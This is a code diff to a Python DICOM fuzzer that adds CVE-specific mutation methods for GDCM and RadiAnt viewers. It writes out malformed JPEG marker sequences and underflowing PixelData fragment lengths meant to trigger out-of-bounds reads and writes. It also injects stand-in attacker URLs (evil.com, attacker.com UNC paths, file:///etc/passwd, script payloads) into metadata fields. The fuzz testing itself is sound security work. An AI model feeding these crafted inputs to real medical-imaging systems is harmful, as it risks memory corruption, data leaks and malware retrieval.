@@ -1,17 +1,23 @@
 """Security Patterns for CVE-specific DICOM vulnerabilities
 
-This module implements specific vulnerability patterns based on real-world CVEs,
-particularly CVE-2025-5943 (MicroDicom out-of-bounds write vulnerability).
+This module implements specific vulnerability patterns based on real-world CVEs:
+- CVE-2025-5943: MicroDicom out-of-bounds write during header parsing
+- CVE-2025-53619: GDCM out-of-bounds read in JPEGBITSCodec (info leak)
+- CVE-2025-53618: GDCM out-of-bounds read in JPEG decompression
+- CVE-2025-11266: GDCM out-of-bounds write in encapsulated PixelData
+- CVE-2025-1001: RadiAnt DICOM Viewer MitM via unverified certificates
 
 SECURITY CONTEXT:
-CVE-2025-5943 affects MicroDicom 3.0.0 to 3.9.6 and involves out-of-bounds writes
-during DICOM header parsing. This can lead to heap corruption and potential RCE.
+These patterns target known vulnerabilities in DICOM parsers and viewers,
+helping identify similar issues in other implementations.
 """
 
 import random
+import struct
 
 from pydicom.dataset import Dataset
 from pydicom.tag import Tag
+from pydicom.uid import UID
 
 from dicom_fuzzer.utils.logger import get_logger
 
@@ -408,6 +414,280 @@ class SecurityPatternFuzzer:
 
         return dataset
 
+    def apply_cve_2025_53619_pattern(self, dataset: Dataset) -> Dataset:
+        """Apply CVE-2025-53619 specific vulnerability patterns.
+
+        CVE-2025-53619 affects Grassroot DICOM (GDCM) and involves an out-of-bounds
+        read in JPEGBITSCodec::InternalCode functionality. A specially crafted DICOM
+        file can lead to information leakage.
+
+        Attack vector: Malformed JPEG-encoded pixel data causing memory read beyond
+        buffer boundaries during decompression.
+
+        Args:
+            dataset: DICOM dataset to mutate
+
+        Returns:
+            Mutated dataset with CVE-2025-53619 patterns
+
+        """
+        # Target JPEG-related transfer syntaxes
+        jpeg_transfer_syntaxes = [
+            "1.2.840.10008.1.2.4.50",  # JPEG Baseline
+            "1.2.840.10008.1.2.4.51",  # JPEG Extended
+            "1.2.840.10008.1.2.4.57",  # JPEG Lossless
+            "1.2.840.10008.1.2.4.70",  # JPEG Lossless SV1
+            "1.2.840.10008.1.2.4.80",  # JPEG-LS Lossless
+            "1.2.840.10008.1.2.4.81",  # JPEG-LS Near-Lossless
+            "1.2.840.10008.1.2.4.90",  # JPEG 2000 Lossless
+            "1.2.840.10008.1.2.4.91",  # JPEG 2000 Lossy
+        ]
+
+        # Set JPEG transfer syntax if possible
+        if hasattr(dataset, "file_meta"):
+            try:
+                dataset.file_meta.TransferSyntaxUID = UID(
+                    random.choice(jpeg_transfer_syntaxes)
+                )
+            except Exception:
+                pass
+
+        # Create malformed JPEG marker sequences
+        jpeg_attack_patterns = [
+            # Truncated SOI marker
+            b"\xff\xd8",
+            # Invalid JPEG markers
+            b"\xff\xd8\xff\xfe\xff\xff\xff\xff",
+            # Malformed SOS (Start of Scan) with invalid component count
+            b"\xff\xd8\xff\xda\x00\x08\xff\x00\x00\x00\x00\x00",
+            # DHT with invalid length
+            b"\xff\xd8\xff\xc4\xff\xff" + b"\x00" * 100,
+            # DQT with malformed quantization table
+            b"\xff\xd8\xff\xdb\x00\x43" + b"\xff" * 64,
+            # SOF with huge dimensions (integer overflow trigger)
+            b"\xff\xd8\xff\xc0\x00\x0b\x08\xff\xff\xff\xff\x01\x01\x11\x00",
+            # Nested SOI markers (parser confusion)
+            b"\xff\xd8" * 10 + b"\xff\xd9",
+        ]
+
+        # Apply to PixelData if present
+        if hasattr(dataset, "PixelData"):
+            attack_payload = random.choice(jpeg_attack_patterns)
+            # Combine with existing data or create new
+            try:
+                # Create encapsulated pixel data format
+                # Basic Offset Table (empty) + Fragment
+                encapsulated = (
+                    b"\xfe\xff\x00\xe0\x00\x00\x00\x00"  # Basic Offset Table
+                    + b"\xfe\xff\x00\xe0"  # Item tag
+                    + struct.pack("<L", len(attack_payload))  # Length
+                    + attack_payload
+                    + b"\xfe\xff\xdd\xe0\x00\x00\x00\x00"  # Sequence delimiter
+                )
+                dataset.PixelData = encapsulated
+            except Exception as e:
+                logger.debug(f"CVE-2025-53619 pattern failed: {e}")
+
+        return dataset
+
+    def apply_cve_2025_1001_pattern(self, dataset: Dataset) -> Dataset:
+        """Apply CVE-2025-1001 specific vulnerability patterns.
+
+        CVE-2025-1001 affects Medixant RadiAnt DICOM Viewer and involves
+        failure to verify update server certificates, enabling MitM attacks.
+
+        While this CVE is about update verification, we can test for related
+        trust issues in DICOM metadata that might reference external URLs.
+
+        Args:
+            dataset: DICOM dataset to mutate
+
+        Returns:
+            Mutated dataset with CVE-2025-1001 related patterns
+
+        """
+        # URL injection targets in DICOM metadata
+        malicious_urls = [
+            "http://evil.com/update.exe",
+            "https://attacker.local/dicom.dcm",
+            "file:///etc/passwd",
+            "ftp://malicious.server/payload",
+            "javascript:alert(1)",
+            "data:text/html,<script>alert(1)</script>",
+            "\\\\attacker.com\\share\\malware.exe",  # UNC path
+        ]
+
+        # URL-containing fields in DICOM
+        url_fields = [
+            "RetrieveURL",
+            "RetrieveLocationUID",
+            "StorageMediaFileSetID",
+            "StorageMediaFileSetUID",
+            "HL7InstanceIdentifier",
+            "ReferencedSOPInstanceUID",
+            "SourceApplicationEntityTitle",
+            "DestinationAE",
+        ]
+
+        for field_name in url_fields:
+            if random.random() < 0.3:  # 30% chance to inject
+                try:
+                    malicious_url = random.choice(malicious_urls)
+                    setattr(dataset, field_name, malicious_url)
+                except Exception as e:
+                    logger.debug(f"URL injection failed for {field_name}: {e}")
+
+        # Also inject in Private Creator elements which may be parsed as URLs
+        private_groups = [0x0009, 0x0011, 0x0013, 0x0015]
+        for group in random.sample(private_groups, 2):
+            try:
+                from pydicom.dataelem import DataElement
+                from pydicom.tag import Tag
+
+                # Private creator
+                creator_tag = Tag(group, 0x0010)
+                dataset[creator_tag] = DataElement(
+                    creator_tag, "LO", "MALICIOUS URL INJECTION"
+                )
+                # Private element with URL
+                data_tag = Tag(group, 0x1000)
+                dataset[data_tag] = DataElement(
+                    data_tag, "LO", random.choice(malicious_urls)
+                )
+            except Exception as e:
+                logger.debug(f"Private element injection failed: {e}")
+
+        return dataset
+
+    def apply_cve_2025_11266_pattern(self, dataset: Dataset) -> Dataset:
+        """Apply CVE-2025-11266 specific vulnerability patterns.
+
+        CVE-2025-11266 affects GDCM and involves out-of-bounds write during
+        parsing of malformed DICOM files with encapsulated PixelData fragments.
+        The issue is triggered by unsigned integer underflow in buffer indexing.
+
+        Args:
+            dataset: DICOM dataset to mutate
+
+        Returns:
+            Mutated dataset with CVE-2025-11266 patterns
+
+        """
+        # Create malformed encapsulated pixel data fragments
+        fragment_attacks = [
+            # Fragment with length causing integer underflow (0xFFFFFFFF - small)
+            b"\xfe\xff\x00\xe0\xff\xff\xff\xff",
+            # Zero-length fragment followed by huge length
+            b"\xfe\xff\x00\xe0\x00\x00\x00\x00" + b"\xfe\xff\x00\xe0\xff\xff\xff\x7f",
+            # Negative offset simulation via unsigned underflow
+            b"\xfe\xff\x00\xe0" + struct.pack("<L", 0xFFFFFFFE),  # -2 as unsigned
+            # Many small fragments to exhaust counter
+            (b"\xfe\xff\x00\xe0\x01\x00\x00\x00\x00") * 1000,
+            # Misaligned fragment boundaries
+            b"\xfe\xff\x00\xe0\x03\x00\x00\x00ABC"  # Odd length
+            + b"\xfe\xff\x00\xe0\x05\x00\x00\x00DEFGH",
+        ]
+
+        # Apply to PixelData
+        if hasattr(dataset, "PixelData") or random.random() < 0.5:
+            try:
+                # Basic Offset Table (malformed)
+                offset_table = b"\xfe\xff\x00\xe0"
+                # Corrupt offset table length
+                offset_table += struct.pack(
+                    "<L",
+                    random.choice(
+                        [
+                            0xFFFFFFFF,  # Max value
+                            0x7FFFFFFF,  # Max signed
+                            0x80000000,  # Min signed (as unsigned)
+                            0xFFFFFFFE,  # Near max
+                        ]
+                    ),
+                )
+
+                # Add attack fragment
+                attack = random.choice(fragment_attacks)
+
+                # Sequence delimiter
+                delimiter = b"\xfe\xff\xdd\xe0\x00\x00\x00\x00"
+
+                dataset.PixelData = offset_table + attack + delimiter
+
+                # Set encapsulated transfer syntax
+                if hasattr(dataset, "file_meta"):
+                    dataset.file_meta.TransferSyntaxUID = UID("1.2.840.10008.1.2.4.50")
+
+            except Exception as e:
+                logger.debug(f"CVE-2025-11266 pattern failed: {e}")
+
+        return dataset
+
+    def apply_cve_2025_53618_pattern(self, dataset: Dataset) -> Dataset:
+        """Apply CVE-2025-53618 specific vulnerability patterns.
+
+        CVE-2025-53618 affects GDCM's JPEGBITSCodec and causes out-of-bounds read
+        during JPEG decompression, potentially leaking sensitive memory contents.
+
+        Similar to CVE-2025-53619 but with different trigger conditions.
+
+        Args:
+            dataset: DICOM dataset to mutate
+
+        Returns:
+            Mutated dataset with CVE-2025-53618 patterns
+
+        """
+        # Specific JPEG bit-stream corruptions that trigger OOB read
+        jpeg_bitstream_attacks = [
+            # Corrupted Huffman table with invalid code lengths
+            b"\xff\xd8\xff\xc4\x00\x1f\x00"
+            + bytes([0x10] * 16)  # Invalid Huffman lengths
+            + b"\x00" * 12,
+            # DHT with code count exceeding table size
+            b"\xff\xd8\xff\xc4\x01\x00\x00"
+            + bytes([0xFF] * 16)  # All max counts
+            + b"\x00" * 200,
+            # Invalid restart interval with malformed RST markers
+            b"\xff\xd8\xff\xdd\x00\x04\xff\xff"
+            + b"\xff\xd0" * 100,  # Many RST0 markers
+            # Corrupted arithmetic coding marker (JPEG arithmetic)
+            b"\xff\xd8\xff\xcc\x00\xff" + b"\xff" * 50,
+            # SOF with invalid precision and component info
+            b"\xff\xd8\xff\xc1\x00\x11\x10"  # 16-bit precision
+            + b"\x00\x10\x00\x10"  # 16x16
+            + b"\x04"  # 4 components (unusual)
+            + b"\x01\x44\x00"  # Component with unusual sampling
+            + b"\x02\x44\x01"
+            + b"\x03\x44\x02"
+            + b"\x04\x44\x03",
+        ]
+
+        # Apply attack pattern
+        if hasattr(dataset, "PixelData") or random.random() < 0.5:
+            try:
+                attack_payload = random.choice(jpeg_bitstream_attacks)
+
+                # Wrap in encapsulated format
+                encapsulated = (
+                    b"\xfe\xff\x00\xe0\x00\x00\x00\x00"  # Empty BOT
+                    + b"\xfe\xff\x00\xe0"
+                    + struct.pack("<L", len(attack_payload))
+                    + attack_payload
+                    + b"\xfe\xff\xdd\xe0\x00\x00\x00\x00"
+                )
+
+                dataset.PixelData = encapsulated
+
+                # Set JPEG transfer syntax
+                if hasattr(dataset, "file_meta"):
+                    dataset.file_meta.TransferSyntaxUID = UID("1.2.840.10008.1.2.4.50")
+
+            except Exception as e:
+                logger.debug(f"CVE-2025-53618 pattern failed: {e}")
+
+        return dataset
+
     def apply_all_patterns(self, dataset: Dataset) -> Dataset:
         """Apply all security patterns to create comprehensive test case.
 
@@ -421,6 +701,10 @@ class SecurityPatternFuzzer:
         # List of all pattern application methods
         patterns = [
             self.apply_cve_2025_5943_pattern,
+            self.apply_cve_2025_53619_pattern,
+            self.apply_cve_2025_53618_pattern,
+            self.apply_cve_2025_11266_pattern,
+            self.apply_cve_2025_1001_pattern,
             self.apply_heap_spray_pattern,
             self.apply_malformed_vr_pattern,
             self.apply_integer_overflow_pattern,
@@ -428,9 +712,9 @@ class SecurityPatternFuzzer:
             self.apply_encoding_confusion_pattern,
         ]
 
-        # Apply 1-3 random patterns
-        num_patterns = random.randint(1, 3)
-        selected_patterns = random.sample(patterns, num_patterns)
+        # Apply 1-4 random patterns
+        num_patterns = random.randint(1, 4)
+        selected_patterns = random.sample(patterns, min(num_patterns, len(patterns)))
 
         for pattern_func in selected_patterns:
             try:
